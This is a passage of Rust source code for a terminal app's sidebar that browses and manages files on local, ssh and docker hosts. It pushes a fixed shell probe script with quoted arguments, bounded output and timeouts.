//! remote_fs — blocking local and remote filesystem access for the sidebar
//! file tree.
//!
//! Local entries come straight from `std::fs`. Remote entries come from the
//! hosts in `config.remote_hosts`: a small POSIX sh probe script is pushed to
//! the far side through the system `ssh` / `docker` binaries (no sshfs, no new
//! Rust dependencies) and its byte output is parsed back here. Atomic remote
//! mutations require Python 3 and Linux renameat2. This mirrors the
//! script-over-ssh philosophy of `jterm_core::jsh_remote`: the far side only
//! ever sees a fixed script plus single-quote-escaped positional parameters,
//! never an interpolated path. The script travels as one `sh -c` argument (not
//! on stdin) so that stdin stays free for the streaming `put`/`untar`
//! payloads — a shell reading the script from a pipe may buffer-read ahead
//! into the payload.
//!
//! Transfers (`cat`/`put` for files, `tar`/`untar` for directories) stream in
//! 64 KiB chunks and never buffer a whole payload in memory; they are capped
//! at [`MAX_TRANSFER_BYTES`] and carry a generous hard timeout, with the
//! calling worker thread doubling as the watchdog that kills a hung child.
//! A [`TransferControl`] rides through every leg: its token cancels the
//! in-flight child on the same kill path (reported as `Interrupted`, never as
//! a failure), and its sink receives throttled bytes-transferred progress.
//!
//! Everything in this module blocks. Callers run it on worker threads and
//! return results to the GTK main loop through a channel, exactly like the
//! file-tree scanner in `super::file_tree`.

use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::mpsc;
use std::time::Duration;

use crate::config::RemoteHost;
use jterm_core::jsh_remote::RemoteHostConfig;

/// Hard cap on entries per directory listing, shared with the local scanner.
pub(crate) const MAX_DIRECTORY_ENTRIES: usize = 4_096;
/// Ask the remote probe for one extra complete pair. Receiving that sentinel
/// proves the visible `MAX_DIRECTORY_ENTRIES` prefix is truncated without
/// making the far side enumerate and serialize the rest of a huge directory.
const REMOTE_LIST_PAIR_LIMIT: usize = MAX_DIRECTORY_ENTRIES + 1;
/// Hard cap on one transfer payload. Exceeding it aborts the child, unlinks
/// the partial local file, and errors — never a silently truncated result.
pub(crate) const MAX_TRANSFER_BYTES: u64 = 512 * 1024 * 1024;
/// NAME_MAX on every Linux filesystem the sidebar can realistically browse.
const MAX_ENTRY_NAME_BYTES: usize = 255;
/// `list` output is bounded: 4097 pairs of at most 255 name bytes each, plus
/// separators and headroom for a hostile far side.
const PROBE_LIST_MAX_OUTPUT: u64 = 2 * 1024 * 1024;
const PROBE_HOME_MAX_OUTPUT: u64 = 8 * 1024;
/// Mutating ops only matter for their stderr, and only a bounded slice of it
/// ever reaches a toast.
const PROBE_OP_MAX_OUTPUT: u64 = 256 * 1024;
/// Listing/home probes get a shorter leash than mutations: a slow `cp -a` of
/// a large tree is legitimate, a slow `ls` is a hung connection.
const PROBE_LIST_TIMEOUT: Duration = Duration::from_secs(20);
const PROBE_OP_TIMEOUT: Duration = Duration::from_secs(60);
/// Transfers get the generous ceiling: 512 MiB over a slow link takes a
/// while, but a hung ssh or tar is still killed rather than pinning a worker.
const TRANSFER_TIMEOUT: Duration = Duration::from_secs(15 * 60);
const WATCHDOG_POLL_INTERVAL: Duration = Duration::from_millis(10);
/// Streaming chunk size for transfer pumps.
const STREAM_CHUNK: usize = 64 * 1024;
/// Recursion limit for the local directory copier; beyond this the copy
/// fails rather than risking the worker thread's stack.
const MAX_COPY_DEPTH: usize = 64;

/// Which filesystem the sidebar is browsing. `Remote` indexes into
/// `config.remote_hosts`; the index is resolved against a snapshot of the
/// host list taken when an operation starts, so a mid-scan config reload
/// cannot silently redirect it at another host. `Transient` is an immutable,
/// memory-only SSH target observed at the foreground-process boundary. It is
/// embedded rather than assigned a synthetic profile index so config edits can
/// never redirect an in-flight operation to another machine.
#[derive(Clone, PartialEq, Eq, Debug)]
pub(crate) enum FsLocation {
    Local,
    Remote(usize),
    Transient(RemoteHostConfig),
}

/// Ephemeral connection material discovered at the live process boundary.
///
/// This is deliberately separate from [`FsLocation`]: the latter is the
/// stable filesystem authority used for profile matching, config reconcile,
/// equality and stale-callback checks.  A reusable jsh ControlPath is only an
/// execution accelerator and must never turn into saved/transient identity.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub(crate) struct FsExecutionOverlay {
    /// Complete SSH option vector when process observation supplied an
    /// explicit or derived ControlPath. Its non-ControlPath projection must
    /// equal the stable target's option vector before execution.
    ssh_args: Option<Vec<String>>,
}

impl FsExecutionOverlay {
    fn from_ssh_args(ssh_args: Vec<String>) -> Self {
        Self {
            ssh_args: Some(ssh_args),
        }
    }

    pub(crate) fn is_empty(&self) -> bool {
        self.ssh_args.is_none()
    }
}

impl FsLocation {
    pub(crate) fn is_remote(&self) -> bool {
        !matches!(self, FsLocation::Local)
    }

    /// Short label for the location selector: `Local`, or the host name
    /// prefixed by its transport (`ssh: ` / `docker: `).
    pub(crate) fn label(&self, hosts: &[RemoteHost]) -> String {
        match self {
            FsLocation::Local => "Local".to_string(),
            FsLocation::Remote(index) => match crate::config::checked_remote_host(hosts, *index) {
                Ok(host) => {
                    let transport = if host.docker { "docker" } else { "ssh" };
                    let name = jterm_core::review_input::safe_inline_display(&host.name, 1024);
                    let destination = match &host.user {
                        Some(user) => format!("{user}@{}", host.host),
                        None => host.host.clone(),
                    };
                    let destination =
                        jterm_core::review_input::safe_inline_display(&destination, 1024);
                    if name == destination {
                        format!("{transport}: {destination}")
                    } else {
                        format!("{transport}: {name} — {destination}")
                    }
                }
                Err(_) => "Remote (unavailable)".to_string(),
            },
            FsLocation::Transient(host) => {
                let name = jterm_core::review_input::safe_inline_display(host.display_name(), 1024);
                format!("ssh: {name} (temporary)")
            }
        }
    }
}

/// A sidebar cut/copy payload: one or more items from a (multi-)selection.
/// Same-location paste is a rename/copy per item; a location mismatch turns
/// the paste into streaming transfers (download, upload, or temp-relayed
/// remote-to-remote hops). A cut deletes only the sources whose transfer
/// actually succeeded.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) struct FsClipboard {
    /// Monotonic identity of the user Copy/Cut action that created this
    /// payload. Slow paste completions may retire only the same intent; the
    /// numeric location can legitimately change when an exact profile is
    /// reordered.
    pub(crate) intent_id: u64,
    pub(crate) loc: FsLocation,
    /// Frozen execution accelerator for the clipboard source. It travels with
    /// the source snapshot so navigating the visible tree cannot redirect a
    /// later download/relay or silently drop the socket that made it usable.
    pub(crate) overlay: FsExecutionOverlay,
    pub(crate) items: Vec<FsClipboardItem>,
    pub(crate) cut: bool,
}

/// One clipboard entry: the source path and whether it is a directory.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) struct FsClipboardItem {
    pub(crate) path: PathBuf,
    pub(crate) is_dir: bool,
}

/// One directory entry, pre-display-sanitization. Local display names may be
/// lossy while their `PathBuf` retains exact bytes; remote list names are
/// accepted only when valid UTF-8 so every row can round-trip through argv.
#[derive(Clone, Debug)]
pub(crate) struct FsEntry {
    pub(crate) name: String,
    pub(crate) path: PathBuf,
    pub(crate) is_dir: bool,
}

/// One bounded directory snapshot. `truncated` is explicit because silently
/// presenting a 4096-entry prefix as a complete remote directory is unsafe for
/// subsequent user decisions.
#[derive(Clone, Debug)]
pub(crate) struct FsListing {
    pub(crate) entries: Vec<FsEntry>,
    pub(crate) truncated: bool,
}

fn sort_entries(entries: &mut [FsEntry]) {
    entries.sort_by(|a, b| {
        b.is_dir
            .cmp(&a.is_dir)
            .then_with(|| a.name.to_lowercase().cmp(&b.name.to_lowercase()))
    });
}

/// The far-side probe, invoked as `sh -c "$SCRIPT" probe <op> [args...]` so
/// the script rides in argv and stdin is free for `put`/`untar` payloads.
/// Wire protocol v4: `list <dir> <limit>` prints at most `limit` NUL-separated
/// `<type>,<name>` pairs (types `d`/`f`/`l`); `cat`/`tar` stream to stdout,
/// `put`/`untar` consume stdin.
/// `stat` prints one line `<t> <size>` (t in {d,f,l}; size 0 for non-files).
/// Exit codes are 0 ok, 2 usage/bad path, 3 cannot enter dir / not the
/// expected kind, 4 operation failed, 17 target exists. The v1 mutation ops
/// (mkdir/mkfile/rm/mv/cp) and the v2 streaming ops (cat/put/tar) remain
/// byte-identical to their protocol versions; v3 changes `untar` to take
/// `<dir> <name>` and refuse an existing `<dir>/<name>` before extracting,
/// and adds `stat`. v4 bounds `list` on the far side and classifies symlinks
/// before directories so a link to a directory is never expandable.
const PROBE_SCRIPT: &str = r#"# remote-fs probe v4 — runs under `sh -c` as $0=probe, <op> [args...] as $1+.
# `list <dir> <limit>` stdout: at most limit NUL-separated pairs "<t>\0<name>\0",
# t in {d,f,l}, names relative. Symlinks are always l, including links to dirs.
# v2 adds streaming ops: cat (file -> stdout), put (stdin -> new file),
# tar (dir -> tar on stdout), untar (stdin tar -> existing dir).
# untar extracts to private same-parent staging and atomically publishes
# without replacing a raced destination. The stat op prints
# one line "<t> <size>", t in {d,f,l}, size = bytes for f, else 0.
# v4: list requires a positive numeric limit and stops after that many pairs.
# Exit codes: 0 ok, 2 usage/bad path, 3 cannot enter dir, 4 op failed, 17 target exists.
set -u
# GNU mv may emulate no-clobber on filesystems without renameat2 support.
# Use the Linux syscall directly and probe the actual destination filesystem.
rename_program='import ctypes
import errno
import os
import sys
import tempfile


def fail(message, code=4):
    print("remote-fs probe: " + message, file=sys.stderr)
    raise SystemExit(code)


if sys.platform != "linux":
    fail("atomic no-replace rename requires Linux")
try:
    libc = ctypes.CDLL(None, use_errno=True)
    renameat2 = libc.renameat2
except (AttributeError, OSError):
    fail("atomic no-replace rename is unavailable in libc")
renameat2.argtypes = [ctypes.c_int, ctypes.c_char_p, ctypes.c_int, ctypes.c_char_p, ctypes.c_uint]
renameat2.restype = ctypes.c_int


def rename(source, destination):
    if renameat2(-100, os.fsencode(source), -100, os.fsencode(destination), 1) != 0:
        number = ctypes.get_errno()
        raise OSError(number, os.strerror(number))


try:
    if sys.argv[1] == "check":
        # Probe the actual destination filesystem before moving user data.
        # No installation or persistent configuration changes are needed.
        with tempfile.TemporaryDirectory(prefix=".jterm-rename-check-", dir=sys.argv[2]) as stage:
            source = os.path.join(stage, "source")
            destination = os.path.join(stage, "destination")
            os.mkdir(source)
            rename(source, destination)
            os.mkdir(source)
            try:
                rename(source, destination)
            except OSError as error:
                if error.errno not in (errno.EEXIST, errno.ENOTEMPTY):
                    raise
            else:
                fail("filesystem did not enforce atomic no-replace rename")
    else:
        rename(sys.argv[2], sys.argv[3])
except OSError as error:
    if sys.argv[1] != "check" and error.errno in (errno.EEXIST, errno.ENOTEMPTY):
        raise SystemExit(17)
    fail("atomic no-replace rename unavailable or failed (errno %s: %s)" % (error.errno, error.strerror))
'
require_noreplace_rename() {
  command -v python3 >/dev/null 2>&1 || {
    echo "remote-fs probe: atomic no-replace rename requires Python 3" >&2
    return 1
  }
  python3 -I -c "$rename_program" check "$1"
}
publish_noreplace() {
  python3 -I -c "$rename_program" publish "$1" "$2"
}
make_stage() {
  stage=
  i=0
  umask 077
  while [ "$i" -lt 32 ]; do
    candidate="$1/.forge-fs-part-$$-$i"
    i=$((i + 1))
    if mkdir "$candidate" 2>/dev/null; then stage=$candidate; break; fi
  done
  [ -n "$stage" ] || return 1
  trap 'rm -rf -- "$stage" 2>/dev/null' EXIT
}
op=${1:-}
case "$op" in
  home)
    cd 2>/dev/null || cd / || exit 3
    pwd
    ;;
  list)
    d=${2:-}; limit=${3:-}
    case "$d" in /*) ;; *) exit 2 ;; esac
    case "$limit" in ''|*[!0-9]*) exit 2 ;; esac
    [ "$limit" -gt 0 ] 2>/dev/null || exit 2
    cd "$d" 2>/dev/null || exit 3
    count=0
    for f in * .[!.]* ..?*; do
      if [ -L "$f" ]; then t=l
      elif [ -d "$f" ]; then t=d
      elif [ -e "$f" ]; then t=f
      else continue
      fi
      printf '%s\0%s\0' "$t" "$f"
      count=$((count + 1))
      [ "$count" -ge "$limit" ] && break
    done
    ;;
  mkdir)
    p=${2:-}
    case "$p" in /*) ;; *) exit 2 ;; esac
    if [ -e "$p" ] || [ -L "$p" ]; then exit 17; fi
    mkdir "$p" || exit 4
    ;;
  mkfile)
    p=${2:-}
    case "$p" in /*) ;; *) exit 2 ;; esac
    if [ -e "$p" ] || [ -L "$p" ]; then exit 17; fi
    # noclobber uses exclusive creation and also refuses a raced symlink.
    (set -C; : > "$p") 2>/dev/null || {
      if [ -e "$p" ] || [ -L "$p" ]; then exit 17; fi
      exit 4
    }
    ;;
  rm)
    p=${2:-}
    case "$p" in /*?*) ;; *) exit 2 ;; esac
    if [ -d "$p" ] && [ ! -L "$p" ]; then rm -rf "$p" || exit 4; else rm -f "$p" || exit 4; fi
    ;;
  mv)
    s=${2:-}; n=${3:-}
    case "$s" in /*) ;; *) exit 2 ;; esac
    case "$n" in /*) ;; *) exit 2 ;; esac
    if [ -e "$n" ] || [ -L "$n" ]; then exit 17; fi
    d=${n%/*}; d=${d:-/}
    require_noreplace_rename "$d" || exit 4
    publish_noreplace "$s" "$n" || exit $?
    ;;
  cp)
    s=${2:-}; n=${3:-}
    case "$s" in /*) ;; *) exit 2 ;; esac
    case "$n" in /*) ;; *) exit 2 ;; esac
    if [ -e "$n" ] || [ -L "$n" ]; then exit 17; fi
    d=${n%/*}; d=${d:-/}
    require_noreplace_rename "$d" || exit 4
    make_stage "$d" || exit 4
    cp -a -- "$s" "$stage/payload" || exit 4
    publish_noreplace "$stage/payload" "$n" || exit $?
    ;;
  cat)
    p=${2:-}
    case "$p" in /*) ;; *) exit 2 ;; esac
    [ -f "$p" ] && [ -r "$p" ] || exit 3
    cat "$p" || exit 4
    ;;
  put)
    p=${2:-}
    case "$p" in /*) ;; *) exit 2 ;; esac
    if [ -e "$p" ] || [ -L "$p" ]; then exit 17; fi
    d=${p%/*}; d=${d:-/}
    make_stage "$d" || exit 4
    t="$stage/payload"
    cat > "$t" || exit 4
    if [ -n "${3:-}" ]; then
      bytes=$(wc -c < "$t" | tr -d '[:space:]')
      [ "$bytes" = "$3" ] || exit 4
    fi
    # Hard-link publication cannot replace an existing file or symlink.
    if ! ln -T -- "$t" "$p" 2>/dev/null; then
      if [ -e "$p" ] || [ -L "$p" ]; then exit 17; fi
      exit 4
    fi
    ;;
  tar)
    p=${2%/}
    case "$p" in /*?*) ;; *) exit 2 ;; esac
    [ -d "$p" ] || exit 3
    command -v tar >/dev/null 2>&1 || { echo "remote-fs: tar is not available" >&2; exit 4; }
    parent=${p%/*}
    tar cf - -C "${parent:-/}" -- "${p##*/}" || exit 4
    ;;
  untar)
    d=${2:-}; n=${3:-}
    case "$d" in /*) ;; *) exit 2 ;; esac
    case "$n" in ""|.|..|*/*) exit 2 ;; esac
    [ -d "$d" ] || exit 3
    if [ -e "$d/$n" ] || [ -L "$d/$n" ]; then exit 17; fi
    command -v tar >/dev/null 2>&1 || { echo "remote-fs probe: tar is not available" >&2; exit 4; }
    require_noreplace_rename "$d" || exit 4
    make_stage "$d" || exit 4
    tar xf - -C "$stage" || exit 4
    count=0
    for f in "$stage"/* "$stage"/.[!.]* "$stage"/..?*; do
      if [ -e "$f" ] || [ -L "$f" ]; then
        count=$((count + 1))
        [ "$f" = "$stage/$n" ] || exit 4
      fi
    done
    [ "$count" -eq 1 ] && [ -d "$stage/$n" ] && [ ! -L "$stage/$n" ] || exit 4
    publish_noreplace "$stage/$n" "$d/$n" || exit $?
    ;;
  stat)
    p=${2:-}
    case "$p" in /*) ;; *) exit 2 ;; esac
    if [ -L "$p" ]; then t=l
    elif [ -d "$p" ]; then t=d
    elif [ -f "$p" ]; then t=f
    else exit 3
    fi
    if [ "$t" = f ]; then
      s=$(wc -c < "$p") || exit 4
    else
      s=0
    fi
    printf '%s %s\n' "$t" "$s"
    ;;
  *) exit 2 ;;
esac
exit 0
"#;

/// Captured result of one finished probe child process.
#[derive(Debug)]
struct Capture {
    /// Exit code, or -1 when the child died to a signal.
    status: i32,
    stdout: Vec<u8>,
    stderr: Vec<u8>,
}

/// Single-quote one argument for the remote `sh -s` command string. ssh
/// re-parses the command on the far side, so every operand must survive one
/// round of POSIX shell word splitting unchanged.
fn sq(arg: &str) -> String {
    let mut quoted = String::with_capacity(arg.len() + 2);
    quoted.push('\'');
    for ch in arg.chars() {
        if ch == '\'' {
            quoted.push_str("'\\''");
        } else {
            quoted.push(ch);
        }
    }
    quoted.push('\'');
    quoted
}

/// Build the local argv that runs the probe on a host. The script travels as
/// ONE quoted argv element — `sh -c '<script>' probe <op> '<arg>'...` — so
/// stdin stays free for streaming payloads (`put`/`untar`); a shell reading
/// the script from a pipe could buffer-read ahead into the payload. ssh
/// joins and re-parses the command remotely, so script and operands are
/// single-quote-escaped. For docker the probe argv is passed through raw,
/// `-i` keeping stdin wired and `-t` deliberately absent so output is never
/// CRLF-mangled.
fn probe_argv(host: &RemoteHost, op: &str, args: &[&str]) -> Vec<String> {
    if host.docker {
        let mut argv = vec!["docker".to_string(), "exec".to_string(), "-i".to_string()];
        if let Some(user) = &host.user {
            argv.push("-u".to_string());
            argv.push(user.clone());
        }
        argv.push(host.host.clone());
        argv.push("sh".to_string());
        argv.push("-c".to_string());
        argv.push(PROBE_SCRIPT.to_string());
        argv.push("probe".to_string());
        argv.push(op.to_string());
        argv.extend(args.iter().map(|arg| (*arg).to_string()));
        return argv;
    }

    let mut command = String::with_capacity(PROBE_SCRIPT.len() + 64);
    command.push_str("sh -c ");
    command.push_str(&sq(PROBE_SCRIPT));
    command.push_str(" probe ");
    command.push_str(op);
    for arg in args {
        command.push(' ');
        command.push_str(&sq(arg));
    }
    let destination = match &host.user {
        Some(user) => format!("{user}@{}", host.host),
        None => host.host.clone(),
    };
    let mut argv = vec![
        "ssh".to_string(),
        "-o".to_string(),
        "BatchMode=yes".to_string(),
        "-o".to_string(),
        "ConnectTimeout=10".to_string(),
    ];
    argv.extend(host.ssh_args.iter().cloned());
    argv.push("--".to_string());
    argv.push(destination);
    argv.push(command);
    argv
}

fn checked_probe_argv(host: &RemoteHost, op: &str, args: &[&str]) -> io::Result<Vec<String>> {
    crate::config::validate_remote_host(host)
        .map_err(|message| io::Error::new(io::ErrorKind::InvalidInput, message))?;
    Ok(probe_argv(host, op, args))
}

/// Spawn a child from an argv vector with the given stdio arrangement. On
/// Unix the child leads its own process group, so [`kill_tree`] can reap the
/// probe and anything it forked (a remote tar, a relay pipeline) in one call.
/// Keep the group leader waitable until its process group has been retired.
/// A cached status prevents later cancellation from signalling a recycled PID.
struct HelperChild {
    child: jterm_core::supervised::SupervisedChild,
    status: Option<std::process::ExitStatus>,
    pipes: PipeDeadline,
    stdin: Option<DeadlinePipe<std::process::ChildStdin>>,
    stdout: Option<DeadlinePipe<std::process::ChildStdout>>,
    stderr: Option<DeadlinePipe<std::process::ChildStderr>>,
}

impl HelperChild {
    fn spawn(command: &mut Command) -> io::Result<Self> {
        let mut child = jterm_core::supervised::SupervisedChild::spawn(command)?;
        let pipes = PipeDeadline::new(TRANSFER_TIMEOUT);
        let stdin = child
            .take_stdin()
            .map(|pipe| pipes.wrap(pipe))
            .transpose()?;
        let stdout = child
            .take_stdout()
            .map(|pipe| pipes.wrap(pipe))
            .transpose()?;
        let stderr = child
            .take_stderr()
            .map(|pipe| pipes.wrap(pipe))
            .transpose()?;
        Ok(Self {
            child,
            status: None,
            pipes,
            stdin,
            stdout,
            stderr,
        })
    }

    fn try_wait(&mut self) -> io::Result<Option<std::process::ExitStatus>> {
        if self.status.is_none() && self.child.root_has_exited()? {
            self.finish()?;
        }
        Ok(self.status)
    }

    fn finish(&mut self) -> io::Result<std::process::ExitStatus> {
        if let Some(status) = self.status {
            return Ok(status);
        }
        self.pipes.retire();
        let status = self.child.reap_after_group_kill()?;
        self.status = Some(status);
        Ok(status)
    }

    fn wait(&mut self) -> io::Result<std::process::ExitStatus> {
        loop {
            if let Some(status) = self.try_wait()? {
                return Ok(status);
            }
            std::thread::sleep(WATCHDOG_POLL_INTERVAL);
        }
    }
}

impl Drop for HelperChild {
    fn drop(&mut self) {
        self.pipes.retire();
        // SupervisedChild owns group cleanup and reaping on all error paths.
    }
}

/// Pipe ownership is independent of child ownership: an escaped session may
/// retain an inherited descriptor after the supervised group has been killed.
/// Nonblocking I/O and a shared deadline bound our own workers in that case.
#[derive(Clone)]
struct PipeDeadline {
    deadline: std::sync::Arc<std::sync::Mutex<std::time::Instant>>,
    retired: std::sync::Arc<std::sync::Mutex<Option<std::time::Instant>>>,
}

impl PipeDeadline {
    fn new(timeout: Duration) -> Self {
        Self {
            deadline: std::sync::Arc::new(std::sync::Mutex::new(
                std::time::Instant::now() + timeout,
            )),
            retired: std::sync::Arc::new(std::sync::Mutex::new(None)),
        }
    }

    fn set_timeout(&self, timeout: Duration) {
        *self.deadline.lock().unwrap_or_else(|e| e.into_inner()) =
            std::time::Instant::now() + timeout;
    }

    fn retire(&self) {
        // Leave a short drain window for bytes already in the kernel pipes.
        *self.retired.lock().unwrap_or_else(|e| e.into_inner()) = Some(std::time::Instant::now());
    }

    fn check(&self) -> io::Result<()> {
        let retired = self.retired.lock().unwrap_or_else(|e| e.into_inner());
        if std::time::Instant::now() >= *self.deadline.lock().unwrap_or_else(|e| e.into_inner())
            || retired.is_some_and(|when| when.elapsed() >= Duration::from_millis(100))
        {
            return Err(io::Error::new(
                io::ErrorKind::TimedOut,
                "helper pipe did not close before its deadline",
            ));
        }
        Ok(())
    }

    fn wrap<T: std::os::fd::AsRawFd>(&self, inner: T) -> io::Result<DeadlinePipe<T>> {
        let fd = inner.as_raw_fd();
        // SAFETY: fd remains owned by `inner`; only its file status changes.
        let flags = unsafe { nix::libc::fcntl(fd, nix::libc::F_GETFL) };
        if flags < 0
            || unsafe { nix::libc::fcntl(fd, nix::libc::F_SETFL, flags | nix::libc::O_NONBLOCK) }
                < 0
        {
            return Err(io::Error::last_os_error());
        }
        Ok(DeadlinePipe {
            inner,
            control: self.clone(),
        })
    }
}

struct DeadlinePipe<T> {
    inner: T,
    control: PipeDeadline,
}

impl<T: std::os::fd::AsRawFd> DeadlinePipe<T> {
    fn wait_ready(&self, events: nix::libc::c_short) -> io::Result<()> {
        self.control.check()?;
        let mut poll = nix::libc::pollfd {
            fd: self.inner.as_raw_fd(),
            events,
            revents: 0,
        };
        // A short bounded poll also observes retire/cancel without a wake pipe.
        let result = unsafe { nix::libc::poll(&mut poll, 1, 10) };
        if result < 0 {
            let error = io::Error::last_os_error();
            if error.kind() != io::ErrorKind::Interrupted {
                return Err(error);
            }
        }
        self.control.check()
    }
}

impl<T: Read + std::os::fd::AsRawFd> Read for DeadlinePipe<T> {
    fn read(&mut self, buffer: &mut [u8]) -> io::Result<usize> {
        if buffer.is_empty() {
            return Ok(0);
        }
        loop {
            self.control.check()?;
            match self.inner.read(buffer) {
                Err(error) if error.kind() == io::ErrorKind::WouldBlock => {
                    self.wait_ready(nix::libc::POLLIN)?
                }
                Err(error) if error.kind() == io::ErrorKind::Interrupted => {}
                result => return result,
            }
        }
    }
}

impl<T: Write + std::os::fd::AsRawFd> Write for DeadlinePipe<T> {
    fn write(&mut self, buffer: &[u8]) -> io::Result<usize> {
        if buffer.is_empty() {
            return Ok(0);
        }
        loop {
            self.control.check()?;
            match self.inner.write(buffer) {
                Err(error) if error.kind() == io::ErrorKind::WouldBlock => {
                    self.wait_ready(nix::libc::POLLOUT)?
                }
                Err(error) if error.kind() == io::ErrorKind::Interrupted => {}
                result => return result,
            }
        }
    }

    fn flush(&mut self) -> io::Result<()> {
        self.inner.flush()
    }
}

fn spawn_argv(
    argv: &[String],
    stdin: Stdio,
    stdout: Stdio,
    stderr: Stdio,
) -> io::Result<HelperChild> {
    let Some((program, args)) = argv.split_first() else {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "empty probe argv",
        ));
    };
    let mut command = Command::new(program);
    command
        .args(args)
        .stdin(stdin)
        .stdout(stdout)
        .stderr(stderr);
    #[cfg(unix)]
    {
        use std::os::unix::process::CommandExt;
        // Own process group, led by the child: one group kill below reaps the
        // probe and every descendant that did not setsid away.
        command.process_group(0);
    }
    HelperChild::spawn(&mut command)
}

/// Send SIGKILL to `child`'s whole process group (Unix; `spawn_argv` made the
/// child lead it), so a probe that forked — `rm -rf` mid-run, a remote tar —
/// cannot survive the watchdog and hold the pipes open.
fn kill_process_group(child: &mut HelperChild) {
    let _ = child.finish();
}

/// Kill `child`'s whole process group and reap the direct child.
fn kill_tree(child: &mut HelperChild) {
    kill_process_group(child);
    let _ = child.wait();
}

/// Poll `child` to exit, killing its whole process group and reaping it past
/// the deadline. The calling worker thread doubles as the watchdog, so a hung
/// ssh or stopped container cannot pin the thread forever.
fn wait_with_timeout(
    child: &mut HelperChild,
    timeout: Duration,
) -> io::Result<std::process::ExitStatus> {
    wait_with_timeout_or_cancel(child, timeout, None)
}

/// Timeout watchdog with optional caller cancellation. Directory scans use
/// the token to retire a superseded ssh/docker probe immediately; the same
/// process-group kill path as a timeout prevents descendants retaining pipes.
fn wait_with_timeout_or_cancel(
    child: &mut HelperChild,
    timeout: Duration,
    cancel: Option<&CancelToken>,
) -> io::Result<std::process::ExitStatus> {
    let deadline = std::time::Instant::now() + timeout;
    loop {
        if let Some(status) = child.try_wait()? {
            return Ok(status);
        }
        if cancel.is_some_and(CancelToken::is_cancelled) {
            kill_tree(child);
            return Err(cancelled_error());
        }
        if std::time::Instant::now() >= deadline {
            kill_tree(child);
            return Err(io::Error::new(
                io::ErrorKind::TimedOut,
                "remote-fs probe timed out",
            ));
        }
        std::thread::sleep(WATCHDOG_POLL_INTERVAL);
    }
}

/// Run a child to completion with piped stdio, bounded output and a hard
/// timeout. `stdin_bytes` is the child's whole stdin (a `put`/`untar`
/// payload, or nothing for the other ops); stdout/stderr are captured
/// bounded, and a stream that overflows `max_out` fails the whole capture
/// rather than being mistaken for a complete one.
fn run_capture(
    argv: &[String],
    stdin_bytes: &[u8],
    timeout: Duration,
    max_out: u64,
) -> io::Result<Capture> {
    run_capture_or_cancel(argv, stdin_bytes, timeout, max_out, None)
}

fn run_capture_or_cancel(
    argv: &[String],
    stdin_bytes: &[u8],
    timeout: Duration,
    max_out: u64,
    cancel: Option<&CancelToken>,
) -> io::Result<Capture> {
    // Check immediately before spawn as well as in the watchdog. This is the
    // important queued-scan boundary: a newer per-path revision must not start
    // an obsolete ssh/docker subprocess after it finally obtains a worker slot.
    if cancel.is_some_and(CancelToken::is_cancelled) {
        return Err(cancelled_error());
    }
    let mut child = spawn_argv(argv, Stdio::piped(), Stdio::piped(), Stdio::piped())?;
    child.pipes.set_timeout(timeout);

    let stdin_writer = child
        .stdin
        .take()
        .map(|mut stdin| {
            let bytes = stdin_bytes.to_vec();
            std::thread::Builder::new()
                .name("forge-remote-fs-stdin".into())
                .spawn(move || stdin.write_all(&bytes))
        })
        .transpose()?;

    let stdout_reader = spawn_bounded_reader(child.stdout.take(), max_out);
    let stderr_reader = spawn_bounded_reader(child.stderr.take(), max_out);

    let status = wait_with_timeout_or_cancel(&mut child, timeout, cancel);
    child.pipes.retire();
    let stdin_result = stdin_writer.map(|writer| writer.join());
    let stdout_result = join_bounded_reader(stdout_reader);
    let stderr_result = join_bounded_reader(stderr_reader);
    let status = status?;
    // BrokenPipe is expected when the remote rejects a request early.
    if status.success() {
        if let Some(result) = stdin_result {
            result.map_err(|_| io::Error::other("probe stdin writer panicked"))??;
        }
    }
    let (stdout, stdout_truncated) = stdout_result?;
    let (stderr, stderr_truncated) = stderr_result?;
    if stdout_truncated || stderr_truncated {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            format!("remote-fs probe produced more than {max_out} bytes of output"),
        ));
    }
    Ok(Capture {
        status: status.code().unwrap_or(-1),
        stdout,
        stderr,
    })
}

/// Read a child pipe on its own thread, capped at `max_out` bytes. Overflow
/// keeps draining into the void so the child is never wedged on a full pipe;
/// the caller treats the returned `truncated` flag as an error (or ignores it
/// for purely diagnostic stderr on streaming transfers).
fn spawn_bounded_reader<R>(
    pipe: Option<R>,
    max_out: u64,
) -> std::thread::JoinHandle<io::Result<(Vec<u8>, bool)>>
where
    R: Read + Send + 'static,
{
    std::thread::spawn(move || {
        let Some(pipe) = pipe else {
            return Ok((Vec::new(), false));
        };
        let mut buffer = Vec::new();
        let mut limited = pipe.take(max_out.saturating_add(1));
        limited.read_to_end(&mut buffer)?;
        if buffer.len() as u64 <= max_out {
            return Ok((buffer, false));
        }
        buffer.truncate(max_out as usize);
        io::copy(&mut limited.into_inner(), &mut io::sink())?;
        Ok((buffer, true))
    })
}

fn join_bounded_reader(
    reader: std::thread::JoinHandle<io::Result<(Vec<u8>, bool)>>,
) -> io::Result<(Vec<u8>, bool)> {
    reader
        .join()
        .map_err(|_| io::Error::other("probe output reader panicked"))?
}

/// Map the probe's exit-code protocol onto io errors. Bounded, sanitized
/// stderr rides along for toasts on the generic failure path.
fn probe_result(capture: Capture) -> io::Result<Capture> {
    match capture.status {
        0 => Ok(capture),
        17 => Err(io::Error::new(
            io::ErrorKind::AlreadyExists,
            "target already exists",
        )),
        3 => Err(io::Error::new(
            io::ErrorKind::NotFound,
            "directory does not exist or is not accessible",
        )),
        2 => Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "probe rejected the request",
        )),
        status => {
            let stderr = String::from_utf8_lossy(&capture.stderr);
            let detail = jterm_core::review_input::safe_inline_display(stderr.trim(), 512);
            if detail.is_empty() {
                Err(io::Error::other(format!(
                    "probe exited with status {status}"
                )))
            } else {
                Err(io::Error::other(format!(
                    "probe exited with status {status}: {detail}"
                )))
            }
        }
    }
}

fn run_probe(
    host: &RemoteHost,
    op: &str,
    args: &[&str],
    timeout: Duration,
    max_out: u64,
) -> io::Result<Capture> {
    run_probe_or_cancel(host, op, args, timeout, max_out, None)
}

fn run_probe_or_cancel(
    host: &RemoteHost,
    op: &str,
    args: &[&str],
    timeout: Duration,
    max_out: u64,
    cancel: Option<&CancelToken>,
) -> io::Result<Capture> {
